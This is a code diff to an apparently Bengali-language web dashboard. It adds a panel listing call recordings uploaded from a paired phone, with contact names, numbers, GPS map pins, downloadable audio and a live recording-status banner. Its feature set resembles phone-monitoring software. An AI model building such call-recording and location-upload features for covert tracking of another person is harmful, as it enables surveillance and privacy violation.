+            কোনো কল রেকর্ডিং পাওয়া যায়নি। মোবাইল থেকে কল করলে বা উপরের "🎙️ রেকর্ড শুরু" দিয়ে রেকর্ড করলে অডিও ও ম্যাপ এখানে যুক্ত হবে।
+          </div>
+        `;
+        return;
+      }
+
+      listContainer.innerHTML = visibleRecs.map((rec) => {
+        const recId = rec.id || rec._docId || "";
+        const attrId = escapeHtmlAttr(recId);
+        const safeName = rec.contactName ? escapeHtmlText(rec.contactName) : "";
+        const safeNum = escapeHtmlText(rec.phoneNumber || "Unknown");
+        const primaryTitle = safeName || safeNum;
+        const mime = rec.mimeType || "audio/mp4";
+        const dataUri = rec.audioBase64 ? `data:${mime};base64,${rec.audioBase64}` : "";
+        const durationLabel = formatCallDurationBn(rec.durationSec);
+        const timeLabel = formatCallTimestampBn(rec.createdAt);
+        const hasCoords = typeof rec.latitude === "number" && typeof rec.longitude === "number";
+        const locBadge = hasCoords
+          ? `<span class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">📍 ${escapeHtmlText(rec.locationLabel || `${Number(rec.latitude).toFixed(3)}, ${Number(rec.longitude).toFixed(3)}`)}</span>`
+          : `<span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">লোকেশন নেই</span>`;
+
+        const callTypeBadge = rec.callType === "INCOMING"
+          ? `<span class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 font-semibold">📥 ইনকামিং</span>`
+          : rec.callType === "OUTGOING"
+            ? `<span class="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 font-semibold">📤 আউটগোয়িং</span>`
+            : `<span class="text-[10px] px-2 py-0.5 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30 font-semibold">🎙️ ম্যানুয়াল</span>`;
+
+        return `
+          <div class="p-4 rounded-2xl bg-slate-950/90 border border-slate-800 hover:border-amber-500/35 transition-all space-y-3">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+              <div class="min-w-0">
+                <div class="flex flex-wrap items-center gap-2">
+                  <span class="text-sm font-bold text-white truncate">${primaryTitle}</span>
+                  ${safeName ? `<span class="text-xs font-mono text-cyan-300">${safeNum}</span>` : ""}
+                  ${callTypeBadge}
+                  ${locBadge}
+                </div>
+                <div class="flex flex-wrap items-center gap-x-3 gap-y-1 mt-1 text-[11px] text-slate-400">
+                  <span class="inline-flex items-center gap-1 text-slate-300">
+                    <i class="ph ph-timer text-amber-400"></i>
+                    <span>${escapeHtmlText(durationLabel)}</span>
+                  </span>
+                  <span class="inline-flex items-center gap-1">
+                    <i class="ph ph-clock"></i>
+                    <span>${escapeHtmlText(timeLabel)}</span>
+                  </span>
+                </div>
+              </div>
+
+              <div class="flex items-center gap-1.5 shrink-0">
+                ${hasCoords ? `
+                  <button type="button" onclick="focusRecordingOnMap('${attrId}')" class="px-2.5 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-[11px] font-semibold flex items-center gap-1 transition-all active:scale-95">
+                    <i class="ph ph-map-pin"></i>
+                    <span>ম্যাপে পিন দেখুন</span>
+                  </button>
+                ` : ""}
+                <button type="button" onclick="downloadCallRecordingAudio('${attrId}')" class="px-2.5 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-[11px] font-semibold flex items-center gap-1 transition-all active:scale-95">
+                  <i class="ph ph-download-simple"></i>
+                  <span>ডাউনলোড</span>
+                </button>
+                <button type="button" onclick="deleteCallRecordingItem('${attrId}')" class="p-1.5 rounded-xl bg-rose-500/10 hover:bg-rose-500/25 text-rose-400 border border-rose-500/25 transition-all active:scale-95" title="রেকর্ডিং মুছুন">
+                  <i class="ph ph-trash text-sm"></i>
+                </button>
+              </div>
+            </div>
+
+            ${dataUri ? `
+              <audio controls preload="metadata" src="${dataUri}" class="w-full h-10 rounded-lg"></audio>
+            ` : `<div class="text-[11px] text-rose-400">অডিও প্লেব্যাক পাওয়া যায়নি</div>`}
+          </div>
+        `;
+      }).join("");
+    }
+
+    function attachPairingSessionCallRecordingsListener(sessionId) {
+      if (!sessionId) return;
+      if (pairedCallRecordingsUnsubscribe) {
+        try { pairedCallRecordingsUnsubscribe(); } catch (_) {}
+        pairedCallRecordingsUnsubscribe = null;
+      }
+      withPulseFirebase((fb) => {
+        try {
+          const { db, collection, query, orderBy, limit, onSnapshot } = fb;
+          const q = query(
+            collection(db, "pairing_sessions", sessionId, "call_recordings"),
+            orderBy("createdAt", "desc"),
+            limit(60)
+          );
+          pairedCallRecordingsUnsubscribe = onSnapshot(
+            q,
+            (snapshot) => {
+              const items = [];
+              snapshot.forEach((docSnap) => {
+                const d = docSnap.data() || {};
+                items.push({ _docId: docSnap.id, ...d });
+              });
+              pairedSessionCallRecordings = items;
+              renderCallRecordingsSection();
+            },
+            (err) => {
+              console.warn("Call recordings listener error:", err);
+            }
+          );
+        } catch (err) {
+          console.warn("Failed attaching call_recordings listener:", err);
+        }
+      });
+    }
+
+    function attachPairingSessionCallRecorderStateListener(sessionId) {
+      if (!sessionId) return;
+      if (pairedCallRecorderStateUnsubscribe) {
+        try { pairedCallRecorderStateUnsubscribe(); } catch (_) {}
+        pairedCallRecorderStateUnsubscribe = null;
+      }
+      withPulseFirebase((fb) => {
+        try {
+          const { db, doc, onSnapshot } = fb;
+          pairedCallRecorderStateUnsubscribe = onSnapshot(
+            doc(db, "pairing_sessions", sessionId, "call_recorder", "live"),
+            (snap) => {
+              const banner = document.getElementById("callRecordingLiveStatusBanner");
+              const bannerText = document.getElementById("callRecordingLiveStatusText");
+              const timerEl = document.getElementById("callRecordingLiveTimer");
+              if (!snap.exists()) return;
+              const d = snap.data() || {};
+              const status = d.status || "IDLE";
+              const target = d.targetNumber || "Unknown";
+              const sec = Number(d.durationSec) || 0;
+              const mm = String(Math.floor(sec / 60)).padStart(2, "0");
+              const ss = String(sec % 60).padStart(2, "0");
+
+              if (status === "RECORDING" || status === "STARTING" || status === "UPLOADING") {
+                if (banner) banner.classList.remove("hidden");
+                if (bannerText) {
+                  bannerText.innerText = status === "UPLOADING"
+                    ? `অডিও ও ম্যাপ লোকেশন আপলোড হচ্ছে (${target})...`
+                    : `মোবাইলে কল রেকর্ড চলছে (${target})`;
+                }
+                if (timerEl) timerEl.innerText = `${mm}:${ss}`;
+              } else {
+                if (banner) banner.classList.add("hidden");
+                if (status === "PERMISSION_NEEDED") {
+                  showModalToast("পারমিশন প্রয়োজন", d.errorMessage || "মোবাইলে মাইক্রোফোন ও লোকেশন পারমিশন দিন।");
+                } else if (status === "ERROR" && d.errorMessage) {
+                  showModalToast("রেকর্ডিং ত্রুটি", d.errorMessage);
+                } else if (status === "SAVED") {
+                  showModalToast("কল রেকর্ড সেভ!", `${target} এর রেকর্ডিং ও ম্যাপ ওয়েবসাইটে এসেছে।`);
+                }
+              }
+            },
+            (err) => {
+              console.warn("Call recorder state listener error:", err);
+            }
+          );
+        } catch (err) {
+          console.warn("Failed attaching call_recorder state listener:", err);
+        }
+      });
+    }
+
     // Auto-render default hotels, live messenger, and resume paired session or inline QR connect on load
     let initialPageBootstrapped = false;
     function bootstrapPulseWebUi() {
@@ -6791,6 +7416,7 @@ git push origin main</pre>
       updateBrowserNotifButtonState();
       renderLiveNotificationFeed();
       renderCallHistoryList();
+      renderCallRecordingsSection();
       initRemoteMicVisualizerBars();
 
       if (activePairedSessionId) {
